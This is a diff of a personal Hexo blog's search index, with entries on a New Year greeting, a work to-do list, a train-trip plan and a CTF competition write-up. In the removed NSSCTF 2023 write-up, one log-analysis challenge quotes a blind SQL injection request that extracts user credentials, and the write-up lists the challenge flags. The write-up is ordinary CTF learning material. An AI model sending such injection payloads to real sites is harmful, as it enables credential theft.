@@ -1,8 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2024-Work-Todo_List</title>
-    <url>/2024/03/23/Work-Todo-List/</url>
+    <title>2024 新年快乐 万事胜意</title>
+    <url>/2024/02/10/2024-ChineseNewYear/</url>
+    <content><![CDATA[<p>祝看到这里的朋友们 新年快乐呀 天天开心~~~</p>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>2024-Work-Todo-List</title>
+    <url>/2024/03/23/2024-Work-Todo-List/</url>
     <content><![CDATA[<h1 id="已经完成的项目"><a href="#已经完成的项目" class="headerlink" title="已经完成的项目"></a>已经完成的项目</h1><ol>
 <li><p>校园教务教学综合信息管理服务平台</p>
 <p>​	2024.1.19 ~ 2024.1.28</p>
@@ -19,6 +28,15 @@
 <li><p>某开源项目功能优化，BugFix</p>
 <p>​	2024.3.18 ~ 2024.3.21</p>
 <p>​	<a href="https://github.com/hongyaohongyao/smart_classroom_demo">smart_classroom_demo</a></p>
+</li>
+</ol>
+<h1 id="一些小饼和亿些大饼"><a href="#一些小饼和亿些大饼" class="headerlink" title="一些小饼和亿些大饼"></a>一些小饼和亿些大饼</h1><ol>
+<li><p><strong>Hayi-GO</strong> Python GUI Ver-8.0</p>
+<p>​	2023.11.17 ~ [ 年度大饼 ]</p>
+<p>​	Base: Python.tkinter</p>
+</li>
+<li><p><strong>Hayi-GO</strong> GUI-INF</p>
+<p>​	[ 有生之年系列大饼 ]</p>
 </li>
 </ol>
 ]]></content>
@@ -49,169 +67,6 @@
       </categories>
       <tags>
         <tag>项目文件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>火车纵贯中国 —— 旅行计划</title>
-    <url>/2024/02/17/Train-Travel-Plan/</url>
-    <content><![CDATA[<h1 id="当前阶段可用的方案"><a href="#当前阶段可用的方案" class="headerlink" title="当前阶段可用的方案"></a>当前阶段可用的方案</h1><p><strong>K7042</strong> ：漠河站 至 哈尔滨站 15:32 —— 09:42 (+1) 坐硬座会没小半条命，可接受~</p>
-<p><strong>T244</strong> ：哈尔滨站 至 长春站 10:44 —— 13:16</p>
-<p><strong>Z384</strong> ：长春站 至 海口站 16:53 —— 16:30 (+2) 坐硬座会没命~</p>
-<p><strong>S8105</strong> ：海口站 至 海口东站 18:07 —— 18:32</p>
-<p><strong>C7337</strong> ：海口东站 至 三亚站 19:18 —— 21:05</p>
-<h1 id="20240218"><a href="#20240218" class="headerlink" title="20240218"></a>20240218</h1><p>假如在暑期出发，以天津站为基地，会有重复的区间。</p>
-<p>PlanA：把全程分段，天津站至漠河站、天津站至海口站。</p>
-<p>PlanB：东北区间重复一次。</p>
-<h1 id="准备列表"><a href="#准备列表" class="headerlink" title="准备列表"></a>准备列表</h1><p><strong>运动相机</strong> ：Insta360 GO 3，Insta360 Ace， DJI Osmo Action 4（决赛圈三选一）</p>
-<p><strong>手机</strong> ：Xiaomi 14</p>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>旅行</tag>
-        <tag>铁路迷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2024 新年快乐 万事胜意</title>
-    <url>/2024/02/10/2024-ChineseNewYear/</url>
-    <content><![CDATA[<p>祝看到这里的朋友们 新年快乐呀 天天开心~~~</p>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>《年会不能停》：我不算理想主义，我只想无愧自己</title>
-    <url>/2024/02/08/Johnny-Keep-Walking/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="e75e024183dcde58821a588319ae2b1a7dcfad182087945551ac248e0616ef7c">10d79030e8222445804370796b90fca1b3149e2c2a0f36d6b4ea04e548758c2133cfffb0296fb6a1d3d40e129f22a5dadcc5126624c7b6b9f99b15a92a684cdae5484439173566f69261aaa62fafad55a7cde7f52998214d6f9e07200d111f100232667ab66f63878191c32dfb71d4cb2b098cda0d92c9548bd251f9cafd25899eee1818429cfb5da6e71f5dfebf62edc1c003d7f92e9e8274d060d29a6e616dcc0fa0db8810a4c8cc835b361cced4eaf0ad58547f4bcbbb6d17650e8b27de36457306795e03d25151a57e9a68eb6dc84c13f247ea4b5be4aafc195e63248a7cd6c0ceaa88286b1d5e4e2246310563676866bd2fc680efa7ead1724c67e9d46de197f2173d9e7c8bacee433b1cc1f81f8504603bd605131ca0f0da6a5d712a7ca76a249c5999ff89242c4464c47e0e74ee15c850ef68b2447243adab3a1ed6a978acb5b293f08e27100f7fb7f3ee34331fb7d01b16e308d8e3ddd91807a7e63079e2393d739808533cdf248f92a762eebd40e5393c1d07acf20d49b8f165fb0668e9b9c550e99dcd6f4c4d8e36c0051e092b24a1476e61eb6563dce64c928c4ad7cc310f98527ac3896b9c53c56b21d8d983ef37847726a4a041a04a62a8faed652baaac9432e8689b90e059f7460f489f06ed2b85ec1317d895b9f17d2c73429f68485579831635eb0fe8912cfb3224f81d1b190e036ed43831b1fa827d58fac100a8796e0ef816feb294feedb181126238313ec9d2803e67ccfc36dafe4958b389166a65e3f1193262ab9dc4110f83e36f5263de873a485112dfe6b34b4e2f0a42f6e80b067c1111c3a7d460b82bb4ba58370304d8bc8d005273b04d50785c43bf014fabe76daca3163841ddafe1e2cc38e40e3202bf1ae58ef47cb67dd10070a123600f395a2961e72de7176b046a01fc5265f1704be8052658e716a77175bd14cad8f0a8457d156f2f30adb17a6111772afa10072657695f802cb6ebed655aea538f99e0f826d456f6a293b4fbbdcbb77cae22a51e5c0af361bb85f8bce72fcc8edb3f0b5acef2f17a408df252a2049912cb872b2ad168b6ef41a629496fa33971209957f56b517b5739d3c44bfbc1fe019e2e8f2018473e1f92392878888f457927bdfb764bcc30e81c1b4780ee4f5b6ba00b3c0537ae63955b873d5ff0068dc23d65d160f0f130cf72a3f5f049801cd5f41591f0d77c1a6f15837e450ae0d95bcba9e5eb0244d841e0a8e809daed4df25c211f5cbbb247361a6feb8a28ebd13fae7378b4194c8ac8ce2cf21d006382cc6a89a073fd373750802cd2c0b2bb2d005ca89fd020aacbafafbe97e4c41bee65e9582915d2d6baae640b72c0b35dc86be773ae9353cee687caa0c149d7ba10cff56cbcf39a158823436ab8a1cc31b70534a9f71fe2b4b5e4c5e5eb3ee9f923d485e19fdb955950697b4bcd60fa487bdf24f4636cae6c7b06d9b9b931fb14eea3861d429553d45f8f3cc04f854b80d1dbba1a48718ec877cec1db2a27fb1bb95bb73baf199755d537970f1b88ecca3467bceb189775531bc50e174e8d793073250e8aa10269c201cd1ad58e0423f2ac7132043d833fd17350e389e33e937704d023b7496095f24c976a15559d43312785befd60c105e3019ebfcebd2e91de9e382041dbe5d4cee8945f20661d38b8c8dc1f45d5510aa823f6364204011ef9692543697e1784412705e2dd947bea1fe913cfd05b81b8330fc744aba0a552fe1ff06e2f6fd92761a7dfda929f436d16a927a9b34a6b964e90d64f7e9d7eb38465ed1ffc2d99947f994da9a4b4d74cde0588e0707d1ff3b48b118efbf97f24f90be1905cdbcb483bb62108ad2d10e8689b5fabadd1cc67dd946c6b364b0649677ba08be662bc2876794513650950169b323efd29186a0b6fd1776ebba0aaff32f17b2a53957602aec56baf5bb302255cd1576357fc5bd5e397b3924c4e562b6b499c696081328e9050cc053eb70e0371caabe007afa4c4c64415aee9fe3d8b46123672eec0a295cf166a1d868a20dea597eda9030db079de3d33aaf918e2ea68545dc6de7c9648712600f7417f933f0effb56e7cf9c3ca5c7dba898c317a4ab28be325bdace50d2ebb984358200b3ff940b573a89205b66486f91b066046e2ec941ef686a1f91972ef7f119982abda795d7eaa44eb60a77649d5103ee502586f0e33e8c980433cd1152c589935b8ee0c514ff9ca048472ab60f10607636a59370626bfa8cbeee15a9a596e3a5b67c0e44369bc7a94fc2552dd59d3c0173234119daeea2f39cdf50978124ee5bdd1b735f388d73d18b332a6fd45de63de0312141f0d80d5aac4d811f76ecaef5a60923b6c04d11702dea0ef7d8f956dda380c786ff4ba598ddeb04473139fabb3eb2fcb62e61655332b453c2953cbdc2b9d7b739105b5daaca021a7e445f93291e5357a9f275b43b00d34f115c0e9c77934b4bc1045806f160bc542de3f2e5b870aece094841e858695d9219f4f42d5fc6aea98fdb4b107d53f2b76074e6b037b2e49457b8709f46c50a663a0f080a46ce3cdac406eca742bf1e26cc7cf5bd43e54db714d647e7ec2bb1b91b848334e433d02b9f43cff91386d5381a18e7cee2de79cf30cf0b554f500d6b74486e7724abc755621f363c2951c581c0928d3fe63617fc4efba9a2a8691ede61c09a5a2ab1a84c38507d5bd2590ba5348b89d6d3862ced9961c7dfd0f835660495f993b5a5216cf1014b17c6ede523ed3b4e5e6020f02326b074bd359bbcd7adcb54d38055609cdedcca715be1aac760a73b012ed4a9f4e2a49f817faaaad2648e80201c1783947eb3a41e3479c1ef948c0735b06167e9cdf6b0b10472ddbd8b8c07b493a62653a208bfe6b5836190ddff1998c2df60d920aa4b73aa0355aeeb6a183ae22c1c851330e210c7f279281f5ea8ca5c008c60b5da3dc90dff3931b01a34d890da70b2a0d4744a4eeedccecfca2b2567e2e9d6344993d048bf23ece9acf98abe6f57c0753746cb6161fd72bdbb9bf5448b2c336acc3fa4aebccca3ae67064f73e5f687983dee1c0cbbc9183b04b16c057f8fd5b59e434edcc280eaa322dcded4a5f4dbfe5e6ae810592797caa801ec2663cab9dcd3f028433cf0d8a146f76a23a651778fee3f14d93ac52f2789caba09812f53d8376f500d5a9b20eebfb62979706ac3b704655a57468496732d877c21d0fe3af1d65e3a993dd6b18ac3010f1418abbbfa15054dd85385dc8fb167a2917d90506688ae6b32f6373da72c1bc4697513b7afa3e699c5d22f30fc46c5c097adaa48c49a7f1099f4acbade8f49daa76c4ed4459d191fead3297b9a95bbeb8bd3cfe11576080b8aac84336e91e8b5407ebf097b0b08aaa39b7f2c63c92efab78afdb94684836db74d2c5f96a0b9396995f18da434896080ca0a2982c59b5b6f6e79b964380dbbb30682eabd47b77092e42a920e1b7c0d492d3f23ac9406aa6f1d5c1f9aba2d2e33a551626cbf2d0e74a4542450ece767928567741eecd3d034017aeeaddb403834ff834c886ba9a626197c108f105167203b2e323a7bb2e8d5e72f84766bc048104c264866565d5048c6d8440431e62dd3ce2a72e8d0a854e6bc1929a7404f156f30e9a3da8a18a7cbfb5fbb530d8efb0869074ae12ce04bc607f9daa64e3d79b6239a0defc8eb091a05d394164fbdc5410f5838dd6d2d877716e24571a6f6f5d7d5ce3112518b2ab4d61da13c4aaa31a9be7fd2280527541754cf71d4c9b731f567a6334863c8a58083f0d801a3328717e3b839bb55972cdfe17695fa0dd7ab3cda340f234ca1a8bba6f0618774c914a538664e57d34c87e4f0be9af6f6153008cb9d744a76add280b1d1a99e9605b248a3f790ac4acadb8a23080f8852f7f3de35532207cef745076702d8542a03e7ebd688ca72ca8ae3b3394cd3f50e05165012893c25f78331ec4b521d11bbc1f805f5ffb9464f31ec7e9e154856a21c4e3b678f6f770020d0fe2cccba59806d107a0f191794e679f4e3aa329631789fbb0caf27c5fd3a3011483712698814d91ca63149d94fb818d32b70fe163ab1af8608a1da950e82bd0573ee38a6ba525fba9fb8db7618ddcfb05ee3cc2cbbfbe3f9dc26bb11e14ec93f1872a07817304361c7a7e4b775afd153c7545d226baa665bd8f1df4f1601d7a880e880308d3fe6484b46f7da74c3b06e3a0d58ac0419ea37d4a54d32e7826d380d9f04a71f9e46404e8aeb323ef7807af4bbfc9b28277f139d5bc354dc9c17745cae8875af2f68711f6ca2c73aedddb5bd33fcdd25fcd777bfc0dbcd251f316ac2bf0e3cd07f1fa70bc6d343fec87be42c43e239d65caa71a066779dbaa38d10010d3a4fde5f141527ea3014e4d8ce76cf36ca9cdfe94b52132661a8d4591a423b61b4250aeefe4e01f0b8e30f199066edaa57c25be3a0255f4813af2f4d832f032b38b20440c491164ec2c27bf79867267237e034b901a277d00a568692658491af2693a436e115b52ac9d6ab4bf3a39e98fa99b2ec2d9902ea19f994e33fe646a12f8b90eb51276c835a37b105b398ae1328873486eab9b65d465c1c6a4e3802342115c433fb3fcd2913c3a8a2a864815b528c7b3275be8a988354569e406358f27dc75625cc5d2f77f3b79f056b0c69c06c5c8a42d7e7d5899d79b6878d1940dce2ea715857f77966d08b9ed778a5cc139d11964a4acc3007c3c1679bf33309e85f4a601bc70ff3b2330751e0b0329f854c27f7080f638b7e89bbf42060bfdecf1f5237dc867693e5faa6fc551ff254eaba3f6611165c67fca8ed773ee4d7279a010004813d18cfaf4ace74bfdc76c49fbf10ed2ec749b954fa0017f6ebd9fc3b1d6ab13880d77b2f1cd4faa62bdc13f700921b1a2e4c082e2e483bc9a57a3519c21d7dfef6c2c7eadddc9b2ac98203289dc4d8c77fd36f06568ea3d8433eb461982f51cd66410935f0b3b31d62566b36bf40e5bfba349c1e40848719924a90c4ee20becf65086423673dad41999099f365b7bbf9e98fb9716a11b26e989db8bdbfbaa87417349c903d9deffeb3e609a1106d0e33fd2e1ab692c440bbe43ecf691e7ae0de9866cb332c282f7311b4ec66e13a7e0f0fe3e905ae57884e360ccedc877cbbb7d9234240fed07782bc484b709ba12a8584cad9665a1ca5a6b062a7e878f7be7491b78831cf76aadf7397e0b06b094dc906386ea4418d694824567604d309a80da9df23472645da1eea1c7260b01750a6991c6198c959b855d28b83059e7819144759921560371a9d0bc2028ce7d0936a94e960bb93ba94b226c9cb7586c5644286e4daf4f9f618cd1141afb16125f70a4c11b3bc79e450cd2ee98ef8bd5721ab05ec4674be36097dc9dbae824ed34f22732789cc99b29048352aaff7971b1b047af6669ca45812418fe8dc67a341ef7b5f914fd803bfcb546262423dff96fe6418be422f889d9464985c1b2f4d523a800dafa367ce9efa24acd11515c0cf8a59fe33462ae12e9b787f45cfaaa23b684be3a4b402e103e4816466d70faeea64ade74bb7a45094262c2f5e03704451a221452de0f95182e4f561ab967fd4ff6c6e937475568437995ad811cb18bf8bef68014e0e9ecb2148820e18f9bc39d7b6f2e19226f16a7d27d89c14a1547c0f5a5d6ca25fd7b16a1ee49aa22e43328eb5eb2ac349b1913b5c521e633b06851aff13cdfaa0d975018d202c57f6aa38b568b0f49a98ab1df68f6d94b6bcdca291507d97ddd90ce56002de16c3910f548f7ee03e9c764499878d9f026fef5b76e97756a794fd345583c5178c50b6c0fa9e9bff293358ce61729beb2816241fcf4edf284a384326bee4bca657a5a353a53be30eb4607d02d1fee67b98df4ffae8653bd814926f76d4a369dd4a8b350a617273a206ffab7aa27ddf31f46925c591b5ba5fb1ad8624c7b9080c1fd5aa38174b90f4d4712d33b6383421440b824e175a5ad7d4d2942ee42d0ccb3f6cc89ba2f1b60c98d1e68c897683c19a54d9da90edb287beadda8545163dddec6e54b44f72a2f0b4a1086d685c36a99b22d45cf64e5aae9f7c58ebe77a7ce5c0290e6e1a7baddeaffc2c2021d170fc0ed2554a345c6d5cb1be8f2681a54a9688493c017be02ad8506671490af3bfbf970e81fcf6ae0a0420a13c0fb2f9d4d5fca4a492ca8fcde32b7e9f830ccf7f3e76fc6aad41b6fa04d8cffab7685357f5afdf1527f3cae68ee1d81ae395e7d1da131e9d2b2a881d5a6048256649c153a14095016541baee6990d0950f01ffccbc7ec311568c7b7d75e16079cadc95aa5d3639c0033a87d22ccc4633e60df2dd5786137b5175e6b515b725af76503c09724ab9e4b2d817a2c895e2cbb65f6e1ebabcac02c28f71ce99cd9e197b34f7dc395bf66d23b1b0446f0cecc848eea0b184b32a4c773dff05f1dccd58a292e9267b70ee2283ee434c7d120064801444f25a7fe56af27a2b0bf6aee7eb5d2dfea102d3243ec86c3991738a69eda100a81faa44ce1cc7e32d19c9fa9f212c4f0aa25df12570084c781426455e9e74d429e83da081015199386a1b7f16793df5a0f56990f0202063f1995ecb95e198bbc0af1ba3f163212300f7190fb3f4b437c1880374e3a08db403dd85d8d4d2b5841084fb94455d2e87dbde5b3d18147b699eebd42b9c436db2f56ec7852dbefbb0da081b7da5d19d56cf6bb275fd8304d225c388676fe8f25530b00466560112ab27a9116a56523ab79c1830d86e39c85c322406a6c4f907757a213480ba864b4dffbd858eae0a7d031707f2137d99639ac65f1b32cbe7ef32661f9e82e102409b10c14ec05c53aec47d1400d1c1c8241b25dc346c8d10761bb530f11151ce22482e2f90f0c1377de06c0a2ffe4ad89036464bdd775b0e08c342590f5491a6045c0e9a3d305dbb5c6321c115acfa50f61a58fde5a442069ee26b5817c0b9da640957d2583b3bd6138313cf41175fde21881c98de604aa8da2f88c9f1b7c690eb3a40de746a4b3f86d7a0066a56d730ea1bd41e357ae93df376270393f795c53784512e0740c6428e6bb58e027eefdf8a4afdb0baecabb4637640a27322321765a3aeab17d6cf968ea459f8b69c8f7afbdd6e2c619b5b94765647038e1bdc1889e8a68cb0608e1883b9fcda9a252e746b9b522b928e857ad73ae97a6a45e7dd64fd3c8106e4c0008325f36c104c2c481f681895ddfac6c71c11fac1daefe0c010e85bca53a48dc67dff0f843159289aa01fec19c4ab0c8d4e0c1729c65805f2e1456b757300086200c113d98f307bc95236b459eeb19860e58044ec76121e996d4ed5c3e5d6bf2a360e3efbba9e9ca465726701db4d54e845c85e1e609816c9aa5d3f028a5ae435bf8574d19059dbb657f0fa6346d09de81adf01ac0704816d194a1bce5d6e1fccbd334cb756feb9e71c75dd8f0f3ad3c01e125c48223db55f64b52596870a209a50117936fe64c78661798f6275aec4c0767dfbdbf19a6a77459fd369152a16fdc1d20693736cbccec8dc338811cdea10a047d40bab62f6432b56ca04408ef8e37496caa2844d978a48395f1c58fc8bb4c8cb7a0e1e82ebaa3f87328665274efdd85a1a9360eb32c06440567b7de98047254414ee37d1872c34642cac66118ced0c71448e96355d7cbfca387b11ca58cb505e106591845c06ed63a12eccf41e8711429efb60c475e053d29594b61d2999f0e73a53c6df389149d5781be3c091f4d640f6024238ec54b3873c77dfa0e3b3aa0229b61c6acb95a1391bcba3b313ac2e35bf18c79e31101b5e7a568e886171bd968d6640406517166c5d23218f314eac23c5fbf442dd83579c570110932a251e6a59d7a6cf5f3e0dce36b258a49ef45cded4f2fce30976cdd7298002104aad4b9c77b5441b5cbda33e5b47109a3d8d6b393c0348b5a37bcf3fa1ef4c7ee5f1196b730477f40d63d6080b3c34bc71fc1ba1a892cd1d3b02734e4c8b37aacb0086679662f1d4931e1f7b7b908c9632f583a8467f4ad8a60cf142f9a646292d8e6a294aebfda195a4af77b9ceca3355158a7a087713ecaba897ea5431597e7ef3ac243771acdbd3b46ae49cbba46e188ccd8de4647986a04cf6032258d7444358575ffea7fb2ed8d878b1b8d9f9d768e48b655a703dd8d931006841615d063d72a86febc824f17e731e1dbb95bc7d18ebd0e303b77b66d5f25434afd3479f6b8bdb9a9</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>影视</tag>
-        <tag>思想</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2024/02/04/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>NSSCTF 2023 WriteUp</title>
-    <url>/2023/11/13/NSSCTF-2023-WriteUp/</url>
-    <content><![CDATA[<h1 id="WEEK1-MISC"><a href="#WEEK1-MISC" class="headerlink" title="WEEK1|MISC"></a>WEEK1|MISC</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>先看题目，为编码转换类型。</p>
-<p><img src="https://s2.loli.net/2023/10/31/qAwKjlP3zEBtQVC.png" alt="image.png"></p>
-<p>下载附件得到一串base类型的编码： </p>
-<p><code>M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=</code></p>
-<p>尝试之后得到解码路径为：base32 - base58 - base64。</p>
-<p>得到Flag为 <strong>flag{Base_15_S0_Easy_^_^}</strong> ，解题完成。</p>
-<h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>先看题目，得到信息为图片隐写类型。</p>
-<p><img src="https://s2.loli.net/2023/10/31/fDgFKQn7HdN1BV4.png" alt="image.png"></p>
-<p>下载附件后得到一个二维码，直接扫码无Flag信息。通过StegSolve - Data Extract打开，调整为以下设置。即可得到Flag为 <strong>flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/10/31/QqLB2W5dSrex8RJ.png" alt="image.png"></p>
-<h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>先看题目，发现信息有WireShark，分析需要进行流量分析。</p>
-<p><img src="https://s2.loli.net/2023/10/31/9XaWKcRD8qvz3dS.png" alt="image.png"></p>
-<p>附件下载完成后通过WireShark工具打开。</p>
-<p><img src="https://s2.loli.net/2023/10/31/9paetzuHDnT8yjP.png" alt="image.png"></p>
-<p>打开“文件-导出对象-HTTP…”选项，尝试用文件大小排序。</p>
-<p><img src="https://s2.loli.net/2023/10/31/SbiduphUJZqm1ea.png" alt="image.png"></p>
-<p>大部分大小为271bytes的为HTTP-404，发现一个文件的文件名带有base64字样。</p>
-<p><img src="https://s2.loli.net/2023/10/31/c9GgnQbCWrkseFI.png" alt="image.png"></p>
-<p>将文本导出后使用base64解码，得到Flag为 <strong>flag{Wri35h4rk_1s_u53ful_b72a609537e6}</strong> ，解题完成。</p>
-<h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p>先看题目，得到信息：多层压缩包，猜测存在密码。</p>
-<p><img src="https://s2.loli.net/2023/10/31/2Or6ivJqHDg1Mxz.png" alt="image.png"></p>
-<p>下载附件，得到一个不带后缀名的文件，使用wxMEdit工具打开，发现二进制源码符合ZIP压缩文件的特性，但缺少ZIP头文件，因此第一步，修改头文件为<code>504B0304</code>；同时在源码最后发现一串base64 编码的信息，转码得到：<code>I like six-digit numbers because they are very concise and easy to remember.</code>猜测有一层压缩包的密码为6位数字。</p>
-<p>解压第一层压缩包得到一个<code>flag.zip</code>文件，直接解压提示文件损坏，继续使用wxMEdit打开。因为前面得到信息有一层压缩包带密码。因此通过源码加密数据0900标记在压缩包的相应位置，至此即可正常打开第二层压缩包。</p>
-<p>最后使用ARCHPR爆破压缩包密码，打开文本即可得到Flag为 <strong>flag{y0u_ar3_the_m4ter_of_z1111ppp_606a4adc}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/10/31/k5oPKlbQ3eLWMHp.png" alt="image.png"></p>
-<h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>先看题目，只有信息：空白格。</p>
-<p><img src="https://s2.loli.net/2023/10/31/4LQdIRv7UzMGACt.png" alt="image.png"></p>
-<p>下载附件后，得到一个文本文档，内容全部为空格和TAB键，一开始不清楚具体的编码类型。</p>
-<p>查询博客后得到，“空白格编码”。</p>
-<blockquote>
-<p><strong>WhiteSpace</strong>，是一种只用空白字符（空格，TAB和回车）编程的语言，而其它可见字符统统为注释。</p>
-<p>解码网站：<a href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
-</blockquote>
-<p>将整个文档内容复制到网站中解码，即可得到Flag为 <strong>flag{w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/10/31/nLVqkMh5FKmQiZJ.png" alt="image.png"></p>
-<h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p><img src="https://s2.loli.net/2023/10/31/wmUgJXP1OMZqv8h.png" alt="image.png"></p>
-<p>下载附件之后，不确定图片隐写的方式，所以通过现有的工具一个个尝试。</p>
-<p>最后使用SilentEye工具成功得到Flag为 <strong>flag{R0ck1ng_y0u_63b0dc13a591}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/10/31/uM6htFvlAgGywNS.png" alt="image.png"></p>
-<h1 id="WEEK2-MISC"><a href="#WEEK2-MISC" class="headerlink" title="WEEK2|MISC"></a>WEEK2|MISC</h1><h2 id="新建Word文档"><a href="#新建Word文档" class="headerlink" title="新建Word文档"></a>新建Word文档</h2><p>先看题目，信息有：Word文档。</p>
-<p><img src="https://s2.loli.net/2023/11/02/NcYhf1H8mbKDqFd.png" alt="image.png"></p>
-<p>下载附件后，直接转为ZIP压缩包格式，打开<code>document.xml</code>文件，找到编码信息。</p>
-<p>信息以”新佛曰“开头，与佛论禅密码格式开头为”佛曰“，因此推测新佛曰是一个编码提示。</p>
-<p>通过在线的新约佛论禅解码器，即可得到Flag为 <strong>flag{Th1s_F0_1s_s00_Cyp3r_495586e3df3a}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/11/02/l9TViHsuNhvP1G8.png" alt="image.png"></p>
-<h2 id="永不消逝的电波"><a href="#永不消逝的电波" class="headerlink" title="永不消逝的电波"></a>永不消逝的电波</h2><p>先看题目，信息有：有节奏的声音，推测频谱图中会有摩斯电码。</p>
-<p><img src="https://s2.loli.net/2023/11/02/Gph9nJRsWFyPDbg.png" alt="image.png"></p>
-<p>下载附件后，用Audacity工具打开。将频谱图按照长短转换为摩斯电码格式，解码后即可得到Flag为 <strong>flag{thebestctferisyou}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/11/02/GnsLmkujH91INqd.png" alt="image.png"></p>
-<h2 id="1-序章"><a href="#1-序章" class="headerlink" title="1-序章"></a>1-序章</h2><p>先看题目，很好，进入连续剧模式了……</p>
-<p><img src="https://s2.loli.net/2023/11/02/9lqbdtJBFNHWwC2.png" alt="image.png"></p>
-<p>下载附件后得到一个日志文件，示例数据为：</p>
-<p><code>172.17.0.1 - - [20/Aug/2023:00:08:21 +0800] &quot;GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),1,1))=40,sleep(1),1)--+&amp;totalPrice=0 HTTP/1.1&quot; 500 353 &quot;-&quot; &quot;python-requests/2.28.2&quot;</code></p>
-<p>对比其他行数据可以发现：<code>group_concat</code>之后的数据是不断变化的，表明这里的SQL盲注应该是依次遍历每一位的值，从ASCII码为40的字符开始，直到找到符合的字符就切换到下一个索引位的字符。但是不太确定最终找到的字符是临界的行数据或是下一个ASCII码。</p>
-<p>由于数据量过大，利用Python脚本实现（摸鱼式写法hhh）：</p>
-<p><img src="https://s2.loli.net/2023/11/06/LI8EexvtOfyDqWH.png" alt="image.png"></p>
-<p>大括号内的信息即为Flag，得到Flag为 <strong>flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}</strong> ，解题完成。</p>
-<h2 id="base"><a href="#base" class="headerlink" title="base!"></a>base!</h2><p>先看题目，信息有base编码。下载附件后，发现直接进行base转码会出问题，结合之前刷到的题猜测存在base64隐写。</p>
-<p><img src="https://s2.loli.net/2023/11/03/kcHQMNbs14RGeoE.png" alt="image.png"></p>
-<p>使用Python脚本进行解码，得到一串编码，最后确定是base58编码格式。</p>
-<p>即可得到Flag为 <strong>flag{b4se_1s_4_g0od_c0d3}</strong> ，解题完成。</p>
-<p><img src="https://s2.loli.net/2023/11/03/jy3CKmIESxR1n6i.png" alt="image.png"></p>
